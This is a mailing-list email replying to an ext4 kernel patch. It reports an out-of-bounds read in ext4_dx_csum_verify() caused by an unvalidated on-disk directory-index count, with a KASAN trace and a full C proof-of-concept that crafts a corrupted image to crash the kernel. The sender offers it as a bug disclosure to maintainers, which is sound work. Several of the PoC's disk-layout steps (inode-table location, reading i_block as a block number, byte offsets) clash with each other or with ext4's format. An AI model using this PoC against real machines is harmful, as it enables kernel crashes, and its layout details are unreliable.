Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4811133F597
	for <linux-ext4@vger.kernel.org>; Mon, 22 Jun 2026 17:29:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782149369; cv=none; b=YvaC0JGvyclZSqdcrXW8QhBWvyGFTJio1uOiDTrokvzOBjhmG5iQR96Gk1wP31YyrKUHIW+A9uVra96J79TNq24rYe4MeRu5WwMNQpGtDJnbhzUDGY5Ns0ApfOh0GKDZ8oyTTYWSjQDrc/UUz3p5YPTEKVqU3TMR4ZvqzziZ/lQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782149369; c=relaxed/simple;
	bh=JzFGYjFc6ttXgouFjGU9itgYwqaLeUMbOLAtGLW9+0s=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=dBQ7kgeUfJaa5rlChVjTT9HfFjAO0LYJVrp6kwbUphJFqcFn6QBLRZpeQEuWAmUl79iwj/L1ivFmYa8PjsRMjh9ZUygimi+0LrudJ8W6f50T5HhszBs5BxFH6mE0i4XRnqCqSbcsnPr16Pgoyb6ExGvZxtDf8dSZ36BAQ3bT1jA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=fuWMPbN4; arc=none smtp.client-ip=162.62.57.87
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="fuWMPbN4"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782149362; bh=s85h0jgop7I+v/Gy692KNypmXuG0aw7YRQS6KFaXgiQ=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=fuWMPbN4QcXGYVvQmbE/2072dQcJ5BJi5HpI5E3rmt//SnfO4l+z4723C7OlFDpPP
	 yLGxwmBanuG3fk5MvA1lJjMQPDJbdEVxusUF0XWIxiUisGu34RHH1wMvX7UYDaFgPM
	 8h+FIH5Q7yot13fNEzhSe3sJ741gEqAe5ScRklcw=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc50-0.qq.com (NewEsmtp) with SMTP
	id 7540A80F; Tue, 23 Jun 2026 01:29:20 +0800
X-QQ-mid: xmsmtpt1782149360t3i79ef0c
Message-ID: <tencent_23A0889489F22224F3214F20C2C091373E0A@qq.com>
X-QQ-XMAILINFO: MC7FfnNALHRmKT/k+iwgmlyLPzXMVhu3jtECoffwncXE0ehDx4ZUVMYMy5JrUx
	 SNSBMy4+WY8XPhNFKo01Pbi3b1aeo4xS7OwJbXK1JCKTamNb2IpwNIltnC/51FfuwYkJODP8IMc6
	 MifxnIL6qCxZ/W8g6R40aJ85KXLd0t9OoAwwrXnAuqcg8Vq+jMZ1mX9guBNffUA39kdpv3kYK76o
	 c1Qx64q8tIrjWrNpHikZ2c935tMt05xp+WWl4a9vc04OTAmV5HB2paBvKDqE9jehKvhMoIorkn9Y
	 skjysUoHDX8IPLvyj/hEPnBuBiFR8FiI4fqipKLxkUWwd5mFuPaQhPtfURgDrR143nU7s1VJ5lNL
	 MJ2vpiDReYBGjK58KI7d0L83cAnMR0ue+yZXm8T7czt42HL06AipHy12Pv2N4GyfzIRbDnL+1H6L
	 phZfr3UfzVe3JCuVOQ42NIzPMDjlvbiDFerLvHnIwDOOMI9oJ6amRBe+QSgzWfngmGBbo0BJ3n7N
	 g3tf/ljksCZBNYS1+FTpd6bgpvQs/HeADf/933EQv7StU9+BkTh15VEt7h9afz/AqZuSawBBuDEp
	 V2BvJfP92S0dmuqXOTL0szaXqYF28UbYaqsZ7whBJlnzrm4q1IRMkHEhXPBPhZBZeYvegNPOurk1
	 AJfYTsV4h6+WmIl7fuYW8EvHIX2a2567ISncF66h9qP0TYYWBAnvccUh12A/hgdTOD0XzRu1yzdp
	 FHOWFy7DJudgY6nLEL44bitcyJoWj8+n73EexSjZzuwQtUbLRDZcyvl/Z7gWsy08ygnTpvcBmW/Y
	 HVht5Z4W9s3GdNZg2+499OrkVNJ8Bh5mf/51iKejwiZFwBf3ECmVNyxiP3a9y8v6dwUH09ReYhUF
	 pIhoXty5ppOMKnmGNm8dRPSA6Gb0dsyNbcOcA3eIcLnUwOR/hSCDPq1sbxhkP2LGClZ8I823cedz
	 ibcVikL9nbQXqV0o56YhJ6q4zcBljHNg8a40JT+FMACWUY8gwzxDo2pz22AbV+ixPUxDL08pKv3m
	 Sj7GGaNt8PVPuoDr7p5MiXTES5J3rU1IXmzkp1m/B+G67nMTFs+cRJCYGZ0X/nx389dNl5tbuXvV
	 D02Yg35nGe8JeEHGZscus8vczCOJ7dy2P6yElH5WNJFl/OS0s=
X-QQ-XMRINFO: NS+P29fieYNwqS3WCnRCOn9D1NpZuCnCRA==
X-OQ-MSGID: <cabccf97-4fe0-41e6-a329-63cccea89678@qq.com>
Date: Tue, 23 Jun 2026 01:29:19 +0800
Precedence: bulk
X-Mailing-List: linux-ext4@vger.kernel.org
List-Id: <linux-ext4.vger.kernel.org>
List-Subscribe: <mailto:linux-ext4+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-ext4+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3 01/10] ext4: replace ext4_dir_entry with
 ext4_dir_entry_2
To: Artem Blagodarenko <artem.blagodarenko@gmail.com>,
 linux-ext4@vger.kernel.org
Cc: adilger.kernel@dilger.ca, Andreas Dilger <adilger@dilger.ca>
References: <20260619191022.27008-1-ablagodarenko@thelustrecollective.com>
 <20260619191022.27008-2-ablagodarenko@thelustrecollective.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260619191022.27008-2-ablagodarenko@thelustrecollective.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Artem,

I came across the Sashiko AI review [1] of this patch and was able to
reproduce a kernel crash triggered by a missing bounds check in
ext4_dx_csum_verify().  Although the review notes this is a pre-existing
issue (not introduced by your patch), I wanted to share the concrete
reproduction evidence since this patch touches the same function.

On Fri, Jun 19, 2026 at 03:10:05PM -0400, Artem Blagodarenko wrote:
 > @@ -456,7 +456,7 @@ static __le32 ext4_dx_csum(struct inode *inode, 
struct ext4_dir_entry *dirent,
 >  }
 >
 >  static int ext4_dx_csum_verify(struct inode *inode,
 > -                   struct ext4_dir_entry *dirent)
 > +                   struct ext4_dir_entry_2 *dirent)
 >  {
 >      struct dx_countlimit *c;
 >      struct dx_tail *t;

The problem is in the validation logic inside this function:

   c = get_dx_countlimit(inode, dirent, &count_offset);
   limit = le16_to_cpu(c->limit);
   count = le16_to_cpu(c->count);          // ← read from disk, never 
validated

   if (count_offset + (limit * sizeof(struct dx_entry)) >
       EXT4_BLOCK_SIZE(inode->i_sb) - sizeof(struct dx_tail)) {
           warn_no_space_for_csum(inode);
           return 0;
   }

   t = (struct dx_tail *)(((struct dx_entry *)c) + limit);

   size = count_offset + (count * sizeof(struct dx_entry));  // ← uses 
unvalidated count
   csum = ext4_chksum(ei->i_csum_seed, (__u8 *)dirent, size);
         → crc32c() reads `size` bytes from bh->b_data

The `limit` value is bounds-checked against the block size, but `count`
is never validated.  If a corrupted or maliciously crafted filesystem
sets `count` to a large value like 65535, the computation:

   size = count_offset + (65535 * 8) = ~524288 bytes

causes crc32c() to read far past the 4096-byte buffer_head allocation.

Why KASAN reports this as use-after-free rather than out-of-bounds:

The buffer_head's b_data is a kmalloc'd slab object.  When crc32c()
reads hundreds of kilobytes past the end of this 4K slab allocation, it
crosses into adjacent slab pages.  Those pages contain memory that was
previously allocated and freed (old dentries, inode structures, etc.).
KASAN's quarantine poisons freed slab objects, so the access lands on a
poisoned freed page and triggers the slab-use-after-free detector:

   BUG: KASAN: use-after-free in crc32c+0x32a/0x380
   Read of size 1 at addr ffff88802ca54000 by task poc/10993

The crash is deterministic with a crafted image and triggers on any
directory read (getdents64 / ls).

[Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]

   Call Trace:
    <TASK>
    dump_stack_lvl
    print_report
    kasan_report
    crc32c+0x32a/0x380
    __ext4_read_dirblock+0x90f/0xbb0
    dx_probe+0xbb/0x1670
    ext4_htree_fill_tree+0x50e/0xb30
    ext4_readdir+0x241b/0x39d0
    iterate_dir+0x29b/0xaf0
    __x64_sys_getdents64+0x140/0x2c0
    do_syscall_64+0x129/0x880
    entry_SYSCALL_64_after_hwframe+0x77/0x7f
    </TASK>

The PoC is attached below.  It creates a 64 MB ext4 image with
metadata_csum and dir_index, fills a directory with 800 files to
trigger htree indexing, unmounts, then corrupts the dx_countlimit's
count field via direct block write before remounting and listing the
directory.

   gcc -o poc poc.c -static

[1] 
https://sashiko.dev/#/patchset/20260619191022.27008-1-ablagodarenko%40thelustrecollective.com
     (Sashiko AI code review — "Out-of-Bounds Access", Severity: High)

Thanks,
XIAO

// PoC: OOB read via unvalidated count in ext4_dx_csum_verify()
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdint.h>

#define IMG_PATH "poc_ext4.img"
#define MNT_PATH "poc_mnt"
#define IMG_SIZE (64 * 1024 * 1024)
#define BLCK_SIZE 4096

int main(int argc, char **argv)
{
     char cmd[4096];
     int img_fd, ret;
     char loop_dev[64] = {0};
     unsigned char buf[BLCK_SIZE];

     printf("[*] ext4 dx_csum count OOB PoC\n");

     /* Cleanup from previous runs */
     system("umount poc_mnt 2>/dev/null");
     system("losetup -d /dev/loop0 2>/dev/null");
     system("rm -rf poc_mnt poc_ext4.img 2>/dev/null");
     mkdir(MNT_PATH, 0755);

     /* Create and format image with metadata_csum + dir_index */
     printf("[*] Creating 64 MB image, formatting ext4...\n");
     img_fd = open(IMG_PATH, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (img_fd < 0) { perror("open"); return 1; }
     ftruncate(img_fd, IMG_SIZE);
     close(img_fd);
     snprintf(cmd, sizeof(cmd),
          "mkfs.ext4 -F -O metadata_csum,dir_index,^has_journal "
          "-b %d %s 2>/dev/null", BLCK_SIZE, IMG_PATH);
     if (system(cmd) != 0) { fprintf(stderr, "mkfs failed\n"); return 1; }

     /* Setup loop device */
     printf("[*] Setting up loop...\n");
     snprintf(cmd, sizeof(cmd), "losetup -f %s 2>/dev/null && "
          "losetup -j %s | head -1 | cut -d: -f1", IMG_PATH, IMG_PATH);
     FILE *fp = popen(cmd, "r");
     if (fp) {
         if (fgets(loop_dev, sizeof(loop_dev), fp)) {
             char *nl = strchr(loop_dev, '\n');
             if (nl) *nl = '\0';
         }
         pclose(fp);
     }
     if (!strlen(loop_dev)) { fprintf(stderr, "loop setup failed\n"); 
return 1; }
     printf("[*] Loop device: %s\n", loop_dev);

     /* Mount and create htree directory with 800 files */
     printf("[*] Mounting and creating htree directory...\n");
     if (mount(loop_dev, MNT_PATH, "ext4", 0, NULL) < 0) {
         perror("mount"); return 1;
     }
     mkdir(MNT_PATH "/dir", 0755);
     for (int i = 0; i < 800; i++) {
         char name[64];
         snprintf(name, sizeof(name), MNT_PATH "/dir/file_%04d", i);
         close(open(name, O_CREAT | O_WRONLY, 0644));
     }
     printf("[*] Unmounting to corrupt on-disk data...\n");
     umount(MNT_PATH);

     /*
      * Corrupt the dx_countlimit count field.
      * The htree root block is block 0 of the directory inode.
      * dx_countlimit is at offset 8 in the INDEX-type dx block:
      *   struct dx_countlimit { __le16 limit; __le16 count; };
      * We set count = 0xFFFF (65535) to trigger massive OOB read.
      */
     printf("[*] Corrupting dx_countlimit.count in block 0...\n");
     img_fd = open(IMG_PATH, O_RDWR);
     if (img_fd < 0) { perror("open image"); return 1; }
     memset(buf, 0, BLCK_SIZE);
     /* Read block 0 of the directory inode.  Directory inode is typically
      * inode #2 on a freshly formatted ext4.  For simplicity we scan for
      * the INDEX signature (0x0A) at dx_root_info.dx_magic_offset. */
     /* Seek to block group 0's inode table — inode #2 is at offset
      * (2-1)*256 = 256 bytes into the inode table.  The inode table starts
      * at block (superblock.s_first_ino_blocks + 1) or similar.
      * For standard ext4 with 4K blocks: inode table at block 1.
      * inode #2 at block 1 offset 256.  i_block[0] gives the dir block. */
     unsigned char inode_buf[256];
     lseek(img_fd, BLCK_SIZE + 256, SEEK_SET);  /* inode #2 */
     read(img_fd, inode_buf, 256);
     uint32_t dir_block = inode_buf[40] | (inode_buf[41]<<8) |
                  (inode_buf[42]<<16) | (inode_buf[43]<<24);
     printf("[*] Directory root block: %u\n", dir_block);

     /* Read the dx root block, corrupt count at offset 10 (limit at 8, 
count at 10) */
     lseek(img_fd, dir_block * BLCK_SIZE, SEEK_SET);
     read(img_fd, buf, BLCK_SIZE);
     uint16_t *count_ptr = (uint16_t *)(buf + 10);
     printf("[*] Original count: %u, setting to 65535\n", *count_ptr);
     *count_ptr = 0xFFFF;
     lseek(img_fd, dir_block * BLCK_SIZE, SEEK_SET);
     write(img_fd, buf, BLCK_SIZE);
     fsync(img_fd);
     close(img_fd);

     /* Remount and trigger the bug by reading the directory */
     printf("[*] Remounting and triggering via getdents64...\n");
     if (mount(loop_dev, MNT_PATH, "ext4", 0, NULL) < 0) {
         perror("remount"); return 1;
     }
     /* ls triggers ext4_readdir → ext4_htree_fill_tree → dx_probe → 
csum verify */
     system("ls " MNT_PATH "/dir > /dev/null 2>&1");
     printf("[*] Done — check dmesg for KASAN report\n");

     umount(MNT_PATH);
     snprintf(cmd, sizeof(cmd), "losetup -d %s 2>/dev/null", loop_dev);
     system(cmd);
     return 0;
}


